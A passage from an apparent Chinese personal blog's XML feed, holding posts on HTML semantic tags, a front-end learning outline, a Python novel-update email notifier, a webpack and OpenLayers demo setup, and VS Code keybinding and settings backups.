class="selector-tag">footer</span>&gt;...</span><br><span class="line">      <span class="selector-tag">article</span>&gt;</span><br><span class="line">          ...</span><br><span class="line">      <span class="selector-tag">footer</span>&gt;<span class="selector-tag">address</span>&gt;...</span><br><span class="line"><span class="comment">//header: 头部，导航或介绍性的内容</span></span><br><span class="line"><span class="comment">//footer: 尾部，包含一些作者信息、相关链接</span></span><br><span class="line"><span class="comment">//aside: 侧边栏，导航</span></span><br><span class="line"><span class="comment">//asdide和header中都可能导航，区别在于，header中的导航多数是到文章自己的目录，而aside的导航多数是到关联页面或者是整站地图。</span></span><br><span class="line"><span class="comment">//address并非像date一样，表示一个给机器阅读的地址，而是表示“文章（作者）的联系方式”，address明确地只关联到article和body</span></span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 基础教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0，前端知识架构</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/0%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/0%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>1，经典的前端教材，比如《JavaScript高级程序设计》《精通CSS》；参考性质的网站 MDN<br>2，前端学习方法？<br> 前端技术的知识架构？<br>前端技术背后的核心思想？</p><span id="more"></span><p>基础：前端的知识架构：</p><ul><li><p>html(用脑图-查找)</p><ul><li>标签的分类<ul><li>文档元信息：元标签</li><li>语义相关：视觉上无区别，各有用途（div,nav,span等）</li><li>链接</li><li>替换型标签：引入外部资源（声音audio，图片img，视频video）</li><li>表单</li><li>表格</li></ul></li></ul></li><li><p>css（用脑图-查找.  CSS 重置样式是什么？</p><ul><li>语法</li><li>功能<ul><li>布局</li><li>绘制</li><li>交互</li></ul></li></ul></li><li><p>js</p><ul><li>语法</li><li>重点<ul><li>异步</li></ul></li></ul></li></ul><p>应用</p><ul><li>浏览器兼容</li><li>网页布局</li><li>性能：前端的优化加速</li><li>页面交互</li></ul><p>工具的使用</p><ul><li>框架Vue/react</li><li>UI框架</li><li>打包 webpack</li><li>包管理 npm</li></ul><p>其他问题</p><ul><li>浏览器如何加载页面（浏览器的实现原理和API）</li><li>网络传输如何发生? http协议</li><li>优化搜索 SEO</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实践：小说更新时通过邮件提醒</title>
      <link href="/categories/Python/python-%E5%AE%9E%E8%B7%B5/python%E5%AE%9E%E8%B7%B5%EF%BC%9A%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%97%B6%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E6%8F%90%E9%86%92/"/>
      <url>/categories/Python/python-%E5%AE%9E%E8%B7%B5/python%E5%AE%9E%E8%B7%B5%EF%BC%9A%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%97%B6%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E6%8F%90%E9%86%92/</url>
      
        <content type="html"><![CDATA[<h3 id="实现：获取起点网址的《剑来》小说目录，若更新则发送邮件。"><a href="#实现：获取起点网址的《剑来》小说目录，若更新则发送邮件。" class="headerlink" title="实现：获取起点网址的《剑来》小说目录，若更新则发送邮件。"></a>实现：获取起点网址的《剑来》小说目录，若更新则发送邮件。</h3><h3 id="分析目标网址，获取需要的内容"><a href="#分析目标网址，获取需要的内容" class="headerlink" title="分析目标网址，获取需要的内容"></a>分析目标网址，获取需要的内容</h3><h4 id="方法1：获取网页的目录元素"><a href="#方法1：获取网页的目录元素" class="headerlink" title="方法1：获取网页的目录元素"></a>方法1：获取网页的目录元素</h4><p>&emsp;&emsp;打开网址<a href="http://book.zongheng.com/showchapter/672340.html">《剑来》</a>，按<strong>F12</strong>打开开发者工具，然后选择元素，右键复制元素的<code>xpath</code>路径。相应的，在python中，可以通过<code>lxml</code>库获取网页内容，然后通过之前复制的<code>xpath</code>来选择相对应的元素。<span id="more"></span></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chap=selector.xpath(&#x27;/html/body/<span class="keyword">div</span>[<span class="number">3</span>]/<span class="keyword">div</span>[<span class="number">2</span>]/<span class="keyword">div</span>[<span class="number">2</span>]/<span class="keyword">div</span>/ul[@<span class="built_in">class</span>=<span class="string">&quot;chapter-list clearfix&quot;</span>]/li&#x27;)</span><br><span class="line">lastTitle=selector.xpath(&#x27;/html/body/<span class="keyword">div</span>[<span class="number">3</span>]/<span class="keyword">div</span>[<span class="number">2</span>]/<span class="keyword">div</span>[<span class="number">2</span>]/<span class="keyword">div</span>/ul[@<span class="built_in">class</span>=<span class="string">&quot;chapter-list clearfix&quot;</span>]/li/a/<span class="built_in">text</span>()&#x27;)</span><br><span class="line"></span><br><span class="line">lastTitle=lastTitle[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><div style="text-align:center"><img src="https://tva4.sinaimg.cn/mw690/005zbIM7gy1gca4s3vtlaj30q00g0dh8.jpg" alt="img1"/></div><h4 id="方法2：获取json数据"><a href="#方法2：获取json数据" class="headerlink" title="方法2：获取json数据"></a>方法2：获取<code>json</code>数据</h4><p>&emsp;&emsp;或者，直接可以打开手机端的<a href="https://m.zongheng.com/h5/chapter/list?bookid=672340">《剑来》页面</a>，同样<strong>按F12</strong>，选择<code>Network</code>选项，然后查看里面内容，可以发现一个<code>json</code>请求（如下图）。</p><div style="text-align:center"><img src="https://tva4.sinaimg.cn/mw690/005zbIM7gy1gca5xhvb6uj30sd0b9jsb.jpg" alt="img2"></div><br><p>&emsp;&emsp;具体网址为：<br><code>https://m.zongheng.com/h5/ajax/chapter/list?h5=1&amp;bookId=672340&amp;pageNum=1&amp;pageSize=20&amp;chapterId=&amp;asc=0</code>，猜测<code>asc=0</code>控制着数据的排序方式，所以改为<code>asc=1</code>并在网页上打开，发现获取的数据依旧是正序，通过对照原有请求的头文件，发现影响请求结果的两个参数:<code>ZHID</code>和<code>Referer</code>。</p><div style="text-align:center"><img src="https://tva4.sinaimg.cn/mw690/005zbIM7gy1gcb1x540flj30i808h3ys.jpg" alt="img3"></div><br>&emsp;&emsp;所以在python进行请求时，也需要构造headers和cookies两个参数。<div style="text-align:center"><img src="https://tva4.sinaimg.cn/mw690/005zbIM7gy1gcb25j7wkcj30mk07fq38.jpg" alt="img4"></div><br><p>&emsp;&emsp;最后根据获取的<code>json</code>数据获取最新章节。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 章节名和章节数（需要先将获取的json字符串反序列化为python对象）</span><br><span class="line">chapterName=chaplist[<span class="string">&#x27;chapterlist&#x27;</span>][<span class="string">&#x27;chapters&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;chapterName&#x27;</span>]</span><br><span class="line">chapterCount=chaplist[<span class="string">&#x27;chapterlist&#x27;</span>][<span class="string">&#x27;chapterCount&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="更新时邮件提醒"><a href="#更新时邮件提醒" class="headerlink" title="更新时邮件提醒"></a>更新时邮件提醒</h3><p>&emsp;&emsp;将第一次获取的章节存为文件<code>temp.json</code>，之后获取的都与之比较。若更新，则通过邮件提醒。<br><br>&emsp;&emsp;数据的存取是通过<code>json</code>的序列化和反序列化方法(<code>json.load()、json.dump()</code>)。<br><br>&emsp;&emsp;而邮件提醒使用的是<code>smtplib</code>库，但是其在服务器上发送邮件时，可能不能通过默认的25端口发送邮件，因为其可能<a href="https://developer.aliyun.com/ask/208527?spm=a2c6h.13524658">被服务商禁止使用</a>。所以需要走SSL连接的465端口。</p><div style="text-align:center"><img src="https://tva3.sinaimg.cn/mw690/005zbIM7gy1gcb7ivtcxhj30ew00l3ya.jpg" alt="img5"></div><br><p>&emsp;&emsp;另外，最好不用网易邮箱(136,126)发送邮件，可能是由于其本身的安全策略，导致它在服务器上抽风性地不能发送邮件。</p><h3 id="附加功能：使用代理"><a href="#附加功能：使用代理" class="headerlink" title="附加功能：使用代理"></a>附加功能：使用代理</h3><p>&emsp;&emsp;由于网站的反爬虫的策略，如果访问过于频繁，可能会导致让你输入验证码才能继续访问（通过<code>json</code>请求获取数据时应该「不会」遇到这个问题）。这个时候就需要代理。我们可以在github上找<code>python</code>编写的爬取代理池项目，或者自己在相关网站上爬取代理。</p><h3 id="附加功能：服务器定时运行"><a href="#附加功能：服务器定时运行" class="headerlink" title="附加功能：服务器定时运行"></a>附加功能：服务器定时运行</h3><p>通过命令<code>crontab -e</code>在服务器上部署定时运行服务。</p><ul><li><p>通过<code>crontab</code>服务定时运行<code>python</code>脚本。但是在<code>crontab</code>上的服务不能很好地杀掉特定的进程，所以上面地<code>python</code>脚本会在每天16:33运行。</p><div style="text-align:center"><img src="https://tva3.sinaimg.cn/mw690/005zbIM7gy1gcb8ud8e91j30fk00igld.jpg" alt="img6"></div><br></li><li><p>通过<code>crontab</code>定时运行<code>shell</code>，<code>shell</code>脚本中控制<code>python</code>程序的运行，停止。<code>crontab</code>服务会每6小时运行。</p><div style="text-align:center"><img src="https://tvax2.sinaimg.cn/mw690/005zbIM7gy1gcb9au0on8j30fj00p0si.jpg" style="margin-bottom:2px;" alt="img7">　<div style="font-size:12px;color:#999999;" >@crontab代码</div></div><br></li></ul><div style="text-align:center"><img src="https://tva2.sinaimg.cn/mw690/005zbIM7gy1gcb9g1a6fej30n00903ys.jpg" style="margin-bottom:2px;" alt="img8">　<div style="font-size:12px;color:#999999;" >@shell代码</div></div><br><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li><a href="https://github.com/linxiaoki/server_monitor"><strong>源码在GitHub上</strong></a></li><li><a href="https://kf.qq.com/touch/wxappfaq/150612YrMBvY150612YN3mUz.html">微信绑定邮件通知</a>，这样发送邮件时微信就会收到提醒。<div style="text-align:center"><img src="https://tva1.sinaimg.cn/orj180/005zbIM7gy1gcgj3gfhanj30u01hcq4t.jpg" alt="img9">　<div style="font-size:12px;color:#999999;" >@服务器通知</div></div></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webgis实践：webpack打包+openlayers demo</title>
      <link href="/categories/webgis-%E5%AE%9E%E8%B7%B5/webgis%E5%AE%9E%E8%B7%B5%EF%BC%9Awebpack%E6%89%93%E5%8C%85-openlayers-demo/"/>
      <url>/categories/webgis-%E5%AE%9E%E8%B7%B5/webgis%E5%AE%9E%E8%B7%B5%EF%BC%9Awebpack%E6%89%93%E5%8C%85-openlayers-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="webpack配置"><a href="#webpack配置" class="headerlink" title="webpack配置"></a>webpack配置</h3><details><summary>package.json文件：安装相关依赖包</summary><pre><code>&#123;  "name": "openlayers-demo",  "version": "1.0.0",  "description": "使用 openlayers 实现地图展示",  "scripts": &#123;    "test": "echo \"Error: no test specirfied\" && exit 1",    "start": "webpack",    "release": "webpack --config ./webpack.production.config.js",    "server": "webpack-dev-server --open"  &#125;,  "author": "k",  "license": "ISC",  "devDependencies": &#123;    "@babel/core": "^7.7.2",    "@babel/preset-env": "^7.7.1",    "@babel/preset-react": "^7.7.0",    "autoprefixer": "^9.7.3",    "babel-loader": "^8.0.6",    "clean-webpack-plugin": "^3.0.0",    "css-loader": "^3.4.1",    "file-loader": "4.2.0",    "html-webpack-plugin": "^3.2.0",    "mini-css-extract-plugin": "^0.9.0",    "postcss-loader": "^3.0.0",    "style-loader": "^1.1.2",    "url-loader": "2.2.0",    "webpack": "^4.41.2",    "webpack-cli": "^3.3.10",    "webpack-dev-server": "^3.9.0"  &#125;,  "dependencies": &#123;    "react": "^16.12.0",    "react-dom": "^16.12.0"  &#125;&#125;</code></pre></details><ul><li><code>yarn install</code>: 安装相关依赖包</li><li><code>yarn run start</code>: 打包并输出开发环境下的文件</li><li><code>yarn run server</code>: 构建并运行本地服务器，可以实时监听更改；</li><li><code>yarn run release</code>: 打包并输出生产环境下的文件<span id="more"></span></li></ul><details><summary>webpack.config.js：开发环境下webpack的配置</summary><pre><code>//webpack.config.jsconst webpack = require("webpack");const HtmlWebpackPlugin = require("html-webpack-plugin");const &#123;CleanWebpackPlugin&#125; = require("clean-webpack-plugin");const MiniCssExtractPlugin = require("mini-css-extract-plugin");const path = require('path');<p>module.exports=&#123;<br>    mode: “development”,<br>    //entry: __dirname+”/app/main.js”,<br>    entry: path.resolve(__dirname, “app/main.js”),<br>    output: &#123;<br>        path: <strong>dirname+”/build”,<br>        filename: “bundle-[hash].js”<br>    &#125;,<br>    devtool: “eval-source-map”,<br>    devServer: &#123;<br>        contentBase: “./build”,<br>        historyApiFallback: true,<br>        inline: true,<br>        port: 8235<br>    &#125;,<br>    module:&#123;<br>        rules: [<br>            &#123;<br>                test: /.jsx?$/,<br>                use: &#123;<br>                    loader: ‘babel-loader’<br>                &#125;,<br>                exclude:/node_modules/<br>            &#125;,&#123;<br>                test: /.css$/,<br>                use:[&#123;<br>                        loader: MiniCssExtractPlugin.loader<br>                     &#125;,&#123;<br>                         loader: ‘css-loader’,<br>                         options: &#123;<br>                             modules: &#123;<br>                                 localIdentName: ‘[name]_[local]–[hash:base64:5]’<br>                             &#125;<br>                         &#125;<br>                     &#125;,&#123;<br>                        loader: ‘postcss-loader’<br>                &#125;],<br>                exclude: /(node_modules|.vscode)/<br>            &#125;,&#123;<br>                test: /.(png|jpe?g|gif|svg)$/,<br>                use:&#123;<br>                    loader: ‘url-loader’, // 进阶版的 file-loader<br>                    options:&#123;<br>                        limit: 10000,<br>                        name: ‘img/[name]</strong>[local]–[hash:7].ext’<br>                    &#125;<br>                &#125;<br>            &#125;<br>        ]<br>    &#125;,<br>    plugins:[<br>        new HtmlWebpackPlugin(&#123;<br>            template: path.resolve(__dirname,”app/index.tmpl.html”)<br>        &#125;),<br>        new CleanWebpackPlugin(),<br>        new MiniCssExtractPlugin(&#123;<br>            filename:’[name].css’<br>        &#125;)<br>    ]<br>&#125;</code></pre></p></details><details><summary>webpack.config.production.js：生产环境下webpack的配置</summary><pre><code>//webpack.production.config.jsconst webpack = require("webpack");const HtmlWebpackPlugin = require("html-webpack-plugin");const &#123;CleanWebpackPlugin&#125; = require("clean-webpack-plugin");const MiniCssExtractPlugin = require("mini-css-extract-plugin");const path = require('path');<p>module.exports=&#123;<br>    mode: “production”,<br>    entry: path.resolve(__dirname, “app/main.js”), //entry: __dirname+”/app/main.js”,<br>    output: &#123;<br>        path: <strong>dirname+”/build”,<br>        filename: “bundle-[hash].js”<br>    &#125;,<br>    devtool: “none”,<br>    devServer: &#123;<br>        contentBase: “./build”,<br>        historyApiFallback: true,<br>        inline: true,<br>        port: 8235<br>    &#125;,<br>    module:&#123;<br>        rules: [<br>            &#123;<br>                test: /.jsx?$/,<br>                use: &#123;<br>                    loader: ‘babel-loader’<br>                &#125;,<br>                exclude:/node_modules/<br>            &#125;,&#123;<br>                test: /.css$/,<br>                use:[&#123;<br>                        loader: MiniCssExtractPlugin.loader<br>                     &#125;,&#123;<br>                         loader: ‘css-loader’,<br>                         options: &#123;<br>                             modules: &#123;<br>                                 localIdentName: ‘[name]_[local]–[hash:base64:5]’<br>                             &#125;<br>                         &#125;<br>                     &#125;,&#123;<br>                        loader: ‘postcss-loader’<br>                &#125;],<br>                exclude: /(node_modules|.vscode)/<br>            &#125;,&#123;<br>                test: /.(png|jpe?g|gif|svg)$/,<br>                use:&#123;<br>                    loader: ‘url-loader’, // 进阶版的 file-loader<br>                    options:&#123;<br>                        limit: 10000,<br>                        name: ‘img/[name]</strong>[local]–[hash:7].ext’<br>                    &#125;<br>                &#125;<br>            &#125;<br>        ]<br>    &#125;,<br>    plugins:[<br>        new webpack.BannerPlugin(‘版权非所有，翻版不究(×_×)’),<br>        new HtmlWebpackPlugin(&#123;<br>            template: path.resolve(__dirname,”app/index.tmpl.html”)<br>        &#125;),<br>        new CleanWebpackPlugin(),<br>        new MiniCssExtractPlugin(&#123;<br>            filename:’[name].css’<br>        &#125;)<br>    ]<br>&#125;</code></pre></p></details><p>&emsp;&emsp;生产环境和开发环境最大的区别在<code>mode</code>和<code>devtool</code>的配置，并且在生产环境下的js文件是已经经过压缩的。</p><details><summary>.babelrc</summary><pre><code>&#123;    "presets": ["@babel/env","@babel/react"]&#125;</code></pre></details>&emsp;&emsp;babel的配置文件，也可以直接在webpack.config.js文件中进行配置，当babel具有太多的配置选项时可以单独分离出一个文件`.babelrc`。<h3 id="openlayers-Demo"><a href="#openlayers-Demo" class="headerlink" title="openlayers Demo"></a>openlayers Demo</h3><p><span style="text-decoration:line-through">使用<code>git page</code>展示地图，不过在浏览器的控制台会出现会出现警告”已阻止载入混合活动内容”，此时的天地图api请求被浏览器阻止，这主要是因为浏览器安全策略，不允许在<code>https</code>网站混入<code>http</code>请求(即：<a href="http://api.tianditu.gov.cn/api?v=3.0&amp;tk=%E7%94%B3%E8%AF%B7%E7%9A%84token)%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9B%B4%E6%94%B9%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE">http://api.tianditu.gov.cn/api?v=3.0&amp;tk=申请的token)。可以通过更改浏览器的安全设置</a>(比如，将火狐浏览器的配置security.mixed_content.block_active_content改为false<br>)；或者直接将api下载到本地(勉强能用)；或者使用反向代理。不过使用<code>https</code>协议已经是一个普遍的趋势，应该也很少会遇到这种情况。。。</span><br>天地图api升级https协议了。。。</p><p><a href="https://github.com/linxiaoki/study_webgis/tree/master/%E5%A4%A9%E5%9C%B0%E5%9B%BE/openlayers_demo">源码</a><br><a href="https://linxiaoki.github.io/webgisDemo/openlayersDemo/">展示</a><br><a href="http://lbs.tianditu.gov.cn/api-new/examples.html">参考官网示例</a></p><h3 id="其他：Demo-LeafLet台风实时路径"><a href="#其他：Demo-LeafLet台风实时路径" class="headerlink" title="其他：Demo-LeafLet台风实时路径"></a>其他：Demo-LeafLet台风实时路径</h3><p><a href="https://github.com/linxiaoki/study_webgis/tree/master/%E5%B0%8F%E4%B8%93%E6%A0%8F/%E5%85%A5%E9%97%A86%EF%BC%9A%E6%89%93%E5%8C%85%E7%BB%83%E4%B9%A0-%E5%9F%BA%E4%BA%8ELeaflet%20%E5%8F%B0%E9%A3%8E%E5%AE%9E%E6%97%B6%E8%B7%AF%E5%BE%84%E5%AE%9E%E7%8E%B0">源码</a><br><a href="https://linxiaoki.github.io/webgisDemo/LeafletDemo1/">展示</a><br><a href="https://xiaozhuanlan.com/topic/9720364158">参考文章</a></p>]]></content>
      
      
      <categories>
          
          <category> webgis 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webgis </tag>
            
            <tag> openlayers </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VsCode：Tabout 和 Emmet 冲突</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode%EF%BC%9Atabout-%E5%92%8C-emmet-%E5%86%B2%E7%AA%81/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode%EF%BC%9Atabout-%E5%92%8C-emmet-%E5%86%B2%E7%AA%81/</url>
      
        <content type="html"><![CDATA[<p>可行方案：设置搜索<code>emmet</code>,将<code>Show Abbreviation Suggestions</code>设置为<strong>always</strong>。</p><h2 id="错误分界线-以下无用"><a href="#错误分界线-以下无用" class="headerlink" title="错误分界线(以下无用)"></a>错误分界线(以下无用)</h2><p>vscode在没有代码提示的情况下不触发 <code>Emmet</code>。<br><br>更改&lt;键盘快捷方式&gt;： 自定义，把<code>Tabout</code> 放在<code>Emmet</code> 前面，即通过改变顺序来更改优先级。<br>不好用，还是再弄一个 快捷键吧。<span id="more"></span></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将键绑定放在此文件中以覆盖默认值auto[]</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;tab&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;tabout&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;when&quot;</span>: <span class="string">&quot;editorTextFocus &amp;&amp; !editorHasMultipleSelections &amp;&amp; !inSnippetMode &amp;&amp; !suggestWidgetVisible&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;alt+oem_3&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;editor.emmet.action.expandAbbreviation&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;when&quot;</span>: <span class="string">&quot;config.emmet.triggerExpansionOnTab &amp;&amp; editorTextFocus &amp;&amp; !editorReadonly &amp;&amp; !editorTabMovesFocus&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;tab&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;-editor.emmet.action.expandAbbreviation&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;when&quot;</span>: <span class="string">&quot;config.emmet.triggerExpansionOnTab &amp;&amp; editorTextFocus &amp;&amp; !editorReadonly &amp;&amp; !editorTabMovesFocus&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>还是不行，换一个插件。看看</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将键绑定放在此文件中以覆盖默认值auto[]</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;alt+oem_3&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;editor.emmet.action.expandAbbreviation&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;when&quot;</span>: <span class="string">&quot;editorTextFocus &amp;&amp; !editorReadonly &amp;&amp; !editorTabMovesFocus&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;tab&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;tabOutOrReindent&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;when&quot;</span>: <span class="string">&quot;editorTextFocus &amp;&amp; !editorReadonly &amp;&amp; !editorTabMovesFocus &amp;&amp; !suggestWidgetVisible &amp;&amp; !inSnippetMode&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> 配置 </category>
          
          <category> vscode配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> vscode </tag>
            
            <tag> Emmet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode setting</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode-setting/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode-setting/</url>
      
        <content type="html"><![CDATA[<h3 id="VSCODE用户配置备份"><a href="#VSCODE用户配置备份" class="headerlink" title="VSCODE用户配置备份"></a>VSCODE用户配置备份</h3><span id="more"></span><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;python.pythonPath&quot;</span>: <span class="string">&quot;D:\\K\\ProgramData\\Python\\Python36\\python.exe&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;[python]&quot;</span>: &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;workbench.colorCustomizations&quot;</span>: &#123;</span><br><span class="line">        <span class="comment">//设置用户选中代码段的颜色 </span></span><br><span class="line">        <span class="comment">//&quot;editor.selectionBackground&quot;: &quot;#09090c&quot;,</span></span><br><span class="line">        <span class="comment">//搜索匹配的背景色</span></span><br><span class="line">        <span class="comment">//&quot;editor.findMatchBackground&quot;: &quot;#ff0000&quot;,</span></span><br><span class="line">        <span class="comment">//&quot;editor.findMatchHighlightBackground&quot;: &quot;#b9b979&quot;,</span></span><br><span class="line">        <span class="comment">//&quot;editor.findRangeHighlightBackground&quot;: &quot;#ff00ff&quot;,</span></span><br><span class="line">        <span class="attr">&quot;terminal.selectionBackground&quot;</span>: <span class="string">&quot;#b9b9798c&quot;</span>,</span><br><span class="line">        <span class="comment">//&quot;terminal.foreground&quot;: &quot;#979b87&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;[javascript]&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;python.dataScience.sendSelectionToInteractiveWindow&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;diffEditor.ignoreTrimWhitespace&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;workbench.iconTheme&quot;</span>: <span class="string">&quot;vscode-icons&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;workbench.settings.useSplitJSON&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;python.formatting.provider&quot;</span>: <span class="string">&quot;yapf&quot;</span>,</span><br><span class="line">    <span class="comment">//flake8  修改最大字符</span></span><br><span class="line">    <span class="attr">&quot;python.linting.flake8Args&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;--max-line-length=248&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;workbench.sideBar.location&quot;</span>: <span class="string">&quot;left&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;git.autofetch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;files.associations&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;*.vue&quot;</span>: <span class="string">&quot;html&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;emmet.excludeLanguages&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;markdown&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span>: <span class="string">&quot;afterDelay&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;files.autoSaveDelay&quot;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="attr">&quot;emmet.showExpandedAbbreviation&quot;</span>: <span class="string">&quot;never&quot;</span>,</span><br><span class="line">    <span 